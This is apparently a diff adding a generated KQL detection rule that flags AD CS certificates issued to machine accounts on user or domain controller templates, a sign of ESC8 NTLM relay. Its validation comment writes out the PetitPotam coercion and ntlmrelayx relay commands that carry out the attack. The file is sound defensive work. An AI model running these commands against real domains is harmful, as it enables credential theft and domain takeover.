@@ -1,0 +1,9 @@
+// ADCS Certificate Issued to a Machine Account on a User Template
+// Detects a certificate request whose requester is a computer account. Coercing a domain controller to authenticate to the AD CS web enrollment endpoint over NTLM and relaying it (ESC8) produces exactly this: the CA sees the DC's machine account enrolling, usually against a user or DC template. Machine accounts do enroll legitimately, so pair this with the template name before escalating.
+// techniques: T1649,T1557.001   severity: high   status: experimental
+// validate: Atomic Red Team T1649
+//   PetitPotam.py -u user -p pass <attacker-ip> <dc-ip>
+//   ntlmrelayx.py -t http://ca.domain/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+// source: rules/credential-access/adcs-machine-account-user-certificate.yml  (GENERATED, do not edit by hand)
+SecurityEvent
+| where (((EventID =~ "4886" or EventID =~ "4887") and (Requester endswith "$")) and ((Attributes has_any (dynamic(["CertificateTemplate:User", "CertificateTemplate:DomainController", "CertificateTemplate:KerberosAuthentication"])))))
